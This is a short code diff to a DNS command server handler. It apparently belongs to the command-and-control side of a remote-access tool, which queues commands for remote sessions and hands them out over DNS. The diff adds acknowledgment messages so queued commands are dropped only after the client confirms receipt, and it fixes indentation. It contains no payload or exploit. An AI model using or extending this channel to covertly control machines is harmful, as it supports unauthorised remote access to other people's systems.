@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+# -*- coding: utf-8 -*-
 
 import copy
 import struct
@@ -269,6 +269,9 @@ class DnsCommandServerHandler(BaseResolver):
         if isinstance(command, Poll) and session is None:
             return [Policy(self.interval, self.kex), Poll()]
 
+        elif isinstance(command, Ack) and (session is None):
+            return [Ack()]
+
         elif isinstance(command, Exit):
             if session and session.system_info:
                 self.on_exit(session.system_info)
@@ -279,16 +282,21 @@ class DnsCommandServerHandler(BaseResolver):
             return [Exit()]
 
         elif isinstance(command, Poll) and (session is not None):
-                self.on_keep_alive(session.system_info)
-                commands = session.commands
-                session.commands = []
-                return commands
+            self.on_keep_alive(session.system_info)
+            commands = session.commands
+            return commands
+
+        elif isinstance(command, Ack) and (session is not None):
+            self.on_keep_alive(session.system_info)
+            if command.amount > len(session.commands):
+                logging.error('ACK: invalid amount of commands: {} > {}'.format(
+                    command.amount, len(session.commands)))
+            session.commands = session.commands[command.amount:]
+            return [Ack()]
 
         elif isinstance(command, SystemInfo) and session is not None:
             session.system_info = command.get_dict()
-            commands = session.commands
-            session.commands = []
-            return commands
+            return [Ack()]
 
         elif isinstance(command, Kex):
             with self.lock:
